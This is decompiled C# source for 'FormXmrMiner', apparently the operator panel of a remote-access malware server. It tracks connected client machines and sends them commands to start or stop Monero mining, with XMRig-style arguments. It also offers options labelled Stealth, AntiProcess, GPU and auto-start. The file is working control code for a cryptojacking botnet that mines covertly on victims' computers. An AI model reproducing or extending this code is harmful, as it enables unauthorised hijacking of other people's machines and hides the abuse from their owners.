using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000A6 RID: 166
	public partial class FormXmrMiner : FormMaterial
	{
		// Token: 0x060004B0 RID: 1200 RVA: 0x0003D4E1 File Offset: 0x0003B6E1
		public FormXmrMiner()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x060004B1 RID: 1201 RVA: 0x0003D504 File Offset: 0x0003B704
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			if (File.Exists("local\\Miner.json"))
			{
				MinerXMR minerXMR = JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\Miner.json"));
				this.materialSwitch1.Checked = minerXMR.AntiProcess;
				this.materialSwitch3.Checked = minerXMR.Stealth;
				this.materialSwitch4.Checked = minerXMR.Gpu;
				this.rjTextBox3.Texts = minerXMR.ArgsStealh;
				this.rjTextBox2.Texts = minerXMR.Args;
				if (minerXMR.AutoStart)
				{
					this.materialSwitch2.Checked = true;
					this.work = true;
					this.materialSwitch7.Checked = true;
				}
			}
		}

		// Token: 0x060004B2 RID: 1202 RVA: 0x0003D5D4 File Offset: 0x0003B7D4
		private void ChangeScheme(object sender)
		{
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.ForeColor = FormMaterial.PrimaryColor;
			this.GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridClients.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060004B3 RID: 1203 RVA: 0x0003D678 File Offset: 0x0003B878
		public Clients[] ClientsAll()
		{
			List<Clients> list = new List<Clients>();
			foreach (object obj in ((IEnumerable)this.GridClients.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((Clients)dataGridViewRow.Tag);
			}
			return list.ToArray();
		}

		// Token: 0x060004B4 RID: 1204 RVA: 0x0003D6EC File Offset: 0x0003B8EC
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients client = array[i];
				Task.Run(delegate()
				{
					client.Disconnect();
				});
			}
			this.GridClients.Rows.Clear();
			base.Hide();
			this.Save();
			e.Cancel = true;
		}

		// Token: 0x060004B5 RID: 1205 RVA: 0x0003D758 File Offset: 0x0003B958
		private void Save()
		{
			File.WriteAllText("local\\Miner.json", JsonConvert.SerializeObject(new MinerXMR
			{
				AntiProcess = this.materialSwitch1.Checked,
				Stealth = this.materialSwitch3.Checked,
				ArgsStealh = this.rjTextBox3.Texts,
				AutoStart = this.materialSwitch2.Checked,
				Gpu = this.materialSwitch4.Checked,
				Args = this.rjTextBox2.Texts
			}, Formatting.Indented));
		}

		// Token: 0x060004B6 RID: 1206 RVA: 0x0003D7E4 File Offset: 0x0003B9E4
		public object[] Args()
		{
			if (this.materialSwitch3.Checked)
			{
				return new object[]
				{
					"Start",
					this.materialSwitch1.Checked,
					this.materialSwitch4.Checked,
					" --cinit-find-x -B --algo=\"rx/0\" " + this.rjTextBox2.Texts,
					" --cinit-find-x -B --algo=\"rx/0\" " + this.rjTextBox3.Texts
				};
			}
			return new object[]
			{
				"Start",
				this.materialSwitch1.Checked,
				this.materialSwitch4.Checked,
				" --cinit-find-x -B --algo=\"rx/0\" " + this.rjTextBox2.Texts
			};
		}

		// Token: 0x060004B7 RID: 1207 RVA: 0x0003D8AF File Offset: 0x0003BAAF
		private void rjButton1_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x060004B8 RID: 1208 RVA: 0x0003D8B8 File Offset: 0x0003BAB8
		private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch7.Checked)
			{
				if (string.IsNullOrEmpty(this.rjTextBox2.Texts))
				{
					return;
				}
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(this.Args());
				}
			}
			else
			{
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(new object[]
					{
						"Stop"
					});
				}
			}
			this.Save();
		}

		// Token: 0x060004B9 RID: 1209 RVA: 0x0003D93B File Offset: 0x0003BB3B
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("Xmr Miner           Online [{0}]", this.GridClients.Rows.Count);
		}

		// Token: 0x060004BA RID: 1210 RVA: 0x0003D962 File Offset: 0x0003BB62
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			this.Save();
		}

		// Token: 0x04000322 RID: 802
		public bool work;
	}
}
